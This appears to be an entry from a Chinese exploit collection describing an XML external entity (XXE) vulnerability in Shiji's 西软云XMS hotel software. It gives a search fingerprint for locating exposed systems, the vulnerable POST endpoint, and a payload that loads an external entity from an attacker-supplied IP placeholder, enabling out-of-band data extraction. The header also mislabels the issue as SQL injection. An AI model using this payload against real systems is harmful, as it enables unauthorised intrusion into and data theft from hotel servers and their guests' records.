# 西软云XML实体注入漏洞（XXE）漏洞

西软云XML实体注入漏洞（XXE） ｜ SQL注入 ｜ —
- **指纹**：`app="shiji-西软云XMS"`
- **请求**：`POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "IP"> %remote;]>
```